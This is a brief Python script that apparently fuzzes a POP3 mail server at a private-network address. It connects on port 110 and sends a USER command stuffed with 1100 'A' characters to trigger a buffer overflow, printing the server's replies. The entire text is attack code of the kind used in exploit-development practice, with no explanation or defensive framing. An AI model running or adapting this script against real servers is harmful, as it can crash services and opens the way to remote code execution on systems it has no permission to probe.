import socket 
buffer = "A" * 1100
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect(('192.168.1.112', 110))
print('We are fuzzing with a length of %s bytes ' %(len(buffer)))
response = s.recv(1024)
print(response)
send = 'USER '+ buffer+'\r\n'
s.send(send.encode())
response = s.recv(1024)
print(response)
s.send(b'PASS PASSWORD\r\n')
s.close()
print('\nDONE!')